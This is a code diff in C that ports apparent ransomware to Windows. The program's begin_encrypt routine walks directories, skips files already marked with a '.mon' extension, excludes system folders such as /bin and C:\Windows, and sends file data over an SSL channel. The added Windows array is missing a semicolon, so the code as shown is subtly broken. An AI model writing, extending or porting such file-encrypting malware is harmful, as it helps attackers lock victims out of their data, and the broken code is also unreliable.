@@ -39,6 +39,7 @@ char *extension = ".mon";
 
 static int is_restricted(char *path)
 {
+    #ifndef _WIN32
     char *restricted[] = {
         "/bin",
         "/boot",
@@ -49,6 +50,11 @@ static int is_restricted(char *path)
         "/sys",
         "/usr"
     };
+    #else
+    char *restricted[] = {
+        "C:\\Windows"
+    }
+    #endif
 
     for (int i = 0; i < sizeof(restricted) / sizeof(restricted[0]); i++) {
         if (strcmp(path, restricted[i]) == 0)
@@ -169,10 +175,17 @@ int begin_encrypt(SSL *channel, char *path, char *key, char *iv)
             strcmp(dir->d_name, "..") != 0 &&
             strstr(dir->d_name, extension) == NULL) {
 
+            #ifndef _WIN32
             if (strcmp(path, "/") == 0)
                 target = link_string(path, dir->d_name, 0);
             else
                 target = link_string(path, dir->d_name, 1);
+            #else
+            if (strcmp(path, "C:\\") == 0)
+                target = link_string(path, dir->d_name, 0);
+            else
+                target = link_string(path, dir->d_name, 1);
+            #endif
 
             if (!is_restricted(target)) {
                 send_channel(channel, link_string(
